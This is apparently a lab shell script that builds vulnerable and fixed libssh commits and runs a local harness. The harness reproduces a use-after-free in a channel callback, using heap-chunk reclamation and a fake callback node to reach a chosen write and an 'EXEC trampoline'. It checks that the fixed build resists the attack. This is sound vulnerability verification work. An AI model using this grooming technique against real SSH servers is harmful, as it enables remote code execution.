#!/bin/sh
# W11 additive lane: reach the W4 benign command WITHOUT the W3/W4 detach of
# the channel's stdout buffer and callback list. After the in-callback free,
# the lab app reclaims the two freed 32-byte chunks by saved address and
# initialises them as a live buffer and a fake callback node. Built against
# the same two pinned commits as run-plain.sh, with no sanitizer and no
# library source change. All traffic stays on 127.0.0.1.
set -u
cd "$(dirname "$0")" || exit 1
HERE=$(pwd)

V=a540e27659b08828ef61f2910a790f7cf2af9f8d
F=7dfabb1fd213196c4912c314b418ff36c882ea54
VS=libssh-mirror-$V
FS=libssh-mirror-$F

provision() {
    sha=$1; dir=$2
    if [ ! -d "$dir" ]; then
        curl -fsSL --max-time 60 \
            "https://codeload.github.com/libssh/libssh-mirror/tar.gz/$sha" \
            -o "$dir.tar.gz" || return 1
        tar -xzf "$dir.tar.gz" || return 1
    fi
}

build_plain() {
    dir=$1; out=$2
    cmake -S "$dir" -B "$out" -G Ninja \
        -DCMAKE_BUILD_TYPE=Release -DCMAKE_C_COMPILER=clang \
        -DWITH_SERVER=ON -DUNIT_TESTING=OFF -DBUILD_SHARED_LIBS=OFF \
        -DWITH_GSSAPI=OFF -DWITH_ZLIB=OFF >"$out.configure.log" 2>&1 &&
    ninja -C "$out" ssh >"$out.build.log" 2>&1
}

provision "$V" "$VS" && provision "$F" "$FS" || exit 1
for pair in "$VS build-plain-vuln vuln" "$FS build-plain-fixed fixed"; do
    set -- $pair
    src=$1; b=$2; kind=$3
    build_plain "$src" "$b" || exit 1
    clang -std=gnu99 -O1 -g -fno-omit-frame-pointer -Iasan-shim \
        -I "$b/src" -I "$src/src" -I "$src/include" -I "$b/include" -I "$b" \
        real_wire.c "$b/src/libssh.a" -lcrypto -lpthread -ldl \
        -o "real_wire-plain-$kind-nd" || exit 1
done

if [ ! -f hostkey ]; then
    ssh-keygen -q -t ed25519 -N '' -f hostkey </dev/null >/dev/null 2>&1 || exit 1
fi

PASS=0; FAIL=0
run_lane() {
    # name, binary kind, mode
    n_name=$1; n_kind=$2; n_mode=$3
    mkdir -p "nodetach-run/$n_name"
    ln -sf "$HERE/hostkey" "nodetach-run/$n_name/hostkey"
    (cd "nodetach-run/$n_name" && timeout 25 \
        "$HERE/real_wire-plain-$n_kind-nd" ./hostkey "$n_mode") \
        >"evidence-nodetach-$n_name.out" 2>&1
    echo "lane $n_name rc=$?"
}

check_vuln() {
    # name: data #2, chosen write, trampoline, clean exit, no detach, marker
    c_out=evidence-nodetach-$1.out
    c_file=no
    [ -f "nodetach-run/$1/evidence-wire-vuln-groom-exec.marker" ] && c_file=yes
    c_d2=$(grep -c 'SERVER data #2' "$c_out")
    c_t=$(grep -c 'SERVER target_after=0x41414141414141c1' "$c_out")
    c_e=$(grep -c 'SERVER EXEC trampoline' "$c_out")
    c_ok=$(grep -c 'CLIENT rc=0 SERVER status=0x0' "$c_out")
    c_det=$(grep -c 'SERVER groom-survive saved' "$c_out")
    c_rc=$(grep -c 'SERVER nodetach reclaim it=.* buf=0x' "$c_out")
    if [ "$c_d2" = 1 ] && [ "$c_t" = 1 ] && [ "$c_e" = 1 ] &&
       [ "$c_ok" = 1 ] && [ "$c_det" = 0 ] && [ "$c_rc" = 1 ] &&
       [ "$c_file" = yes ]; then
        PASS=$((PASS+1)); echo "PASS-$1 data2=$c_d2 target=$c_t exec=$c_e detach=$c_det reclaim=$c_rc file=$c_file"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1 got[$c_d2 $c_t $c_e $c_ok $c_det $c_rc $c_file]"
    fi
}

check_fixed() {
    c_out=evidence-nodetach-$1.out
    c_file=no
    [ -f "nodetach-run/$1/evidence-wire-vuln-groom-exec.marker" ] && c_file=yes
    c_d2=$(grep -c 'SERVER data #2' "$c_out")
    c_t=$(grep -c 'SERVER target_after=0x41414141414141c1' "$c_out")
    c_e=$(grep -c 'SERVER EXEC trampoline' "$c_out")
    if [ "$c_d2" = 0 ] && [ "$c_t" = 0 ] && [ "$c_e" = 0 ] &&
       [ "$c_file" = no ]; then
        PASS=$((PASS+1)); echo "PASS-$1 data2=0 target=0 exec=0 file=no"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1 got[$c_d2 $c_t $c_e $c_file]"
    fi
}

run_lane vuln-nodetach vuln groom-nodetach-exec
check_vuln vuln-nodetach
if [ -f nodetach-run/vuln-nodetach/evidence-wire-vuln-groom-exec.marker ]; then
    mv nodetach-run/vuln-nodetach/evidence-wire-vuln-groom-exec.marker \
       evidence-nodetach-sideeffect.kept
fi

run_lane fixed-nodetach fixed groom-nodetach-exec
check_fixed fixed-nodetach

# Negative control: without address-directed reclamation the server faults
# at the freed callback iterator; no chosen command is reached.
run_lane vuln-bare vuln groom-nodetach-bare
b_out=evidence-nodetach-vuln-bare.out
b_bad=$(grep -c 'CLIENT rc=0 SERVER status=0x' "$b_out")
b_ok=$(grep -c 'CLIENT rc=0 SERVER status=0x0' "$b_out")
b_e=$(grep -c 'SERVER EXEC trampoline' "$b_out")
b_done=$(grep -c 'SERVER done data_packets=2' "$b_out")
if [ "$b_bad" = 1 ] && [ "$b_ok" = 0 ] && [ "$b_e" = 0 ] && [ "$b_done" = 0 ]; then
    PASS=$((PASS+1)); echo "PASS-vuln-bare server_fault=yes exec=no server_done=no"
else
    FAIL=$((FAIL+1)); echo "FAIL-vuln-bare got[status_lines=$b_bad clean=$b_ok exec=$b_e done=$b_done]"
fi

# Determinism: three independent vulnerable no-detach runs.
for i in 1 2 3; do
    run_lane "vuln-repeat$i" vuln groom-nodetach-exec
    check_vuln "vuln-repeat$i"
    if [ -f "nodetach-run/vuln-repeat$i/evidence-wire-vuln-groom-exec.marker" ]; then
        mv "nodetach-run/vuln-repeat$i/evidence-wire-vuln-groom-exec.marker" \
           "evidence-nodetach-repeat$i.kept"
    fi
done

echo "nodetach: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
